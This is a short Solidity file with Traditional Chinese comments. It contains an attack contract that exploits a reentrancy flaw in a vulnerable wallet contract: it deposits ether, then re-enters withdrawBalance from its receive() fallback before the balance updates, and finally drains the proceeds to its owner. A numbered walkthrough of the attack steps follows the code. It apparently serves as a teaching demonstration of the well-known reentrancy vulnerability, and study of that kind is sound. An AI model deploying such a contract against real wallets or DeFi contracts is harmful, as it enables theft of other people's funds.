// 攻擊合約：通過重入攻擊剝削脆弱的錢包合約
contract AttackWallet {
    // 目標合約的地址
    Wallet public vulnerableWallet;
    
    // 攻擊者地址
    address public owner;
    
    // 紀錄攻擊次數，用於控制攻擊迴圈
    uint public attackCount;
    
    // 初始化攻擊合約
    constructor(address _vulnerableWallet) {
        vulnerableWallet = Wallet(_vulnerableWallet);
        owner = msg.sender;
        attackCount = 0;
    }
    
    // 開始攻擊函數
    function attack() external payable {
        // 首先向錢包合約存入一些資金
        vulnerableWallet.deposit{value: msg.value}();
        
        // 觸發提款，這將啟動重入攻擊
        vulnerableWallet.withdrawBalance();
    }
    
    // 回退函數：當接收到以太幣時會被自動調用
    // 這是重入攻擊的核心，當vulnerable合約向我們發送資金時，我們會再次調用withdrawBalance
    receive() external payable {
        attackCount++;
        
        // 限制攻擊次數，防止耗盡gas或棧深度過高
        if (attackCount < 3) {
            // 在收到資金後，立即再次調用提款函數，此時餘額尚未被更新
            vulnerableWallet.withdrawBalance();
        }
    }
    
    // 提取攻擊所得的資金
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

/*
攻擊步驟說明：
1. 部署漏洞錢包合約 Wallet
2. 部署攻擊合約 AttackWallet，並傳入漏洞錢包合約地址
3. 攻擊者呼叫 attack() 函數並發送一些以太幣（例如 1 ETH）
4. 攻擊合約會先將這些以太幣存入漏洞錢包，然後調用 withdrawBalance()
5. 當漏洞錢包執行 msg.sender.call 發送以太幣時，會觸發攻擊合約的 receive() 函數
6. receive() 函數會再次調用 withdrawBalance()，在原始的餘額更新前重復提款
7. 這個循環會重復直到攻擊次數達到限制或gas耗盡
8. 最後，攻擊者可以從攻擊合約提取所有資金，獲得比初始存入更多的以太幣
*/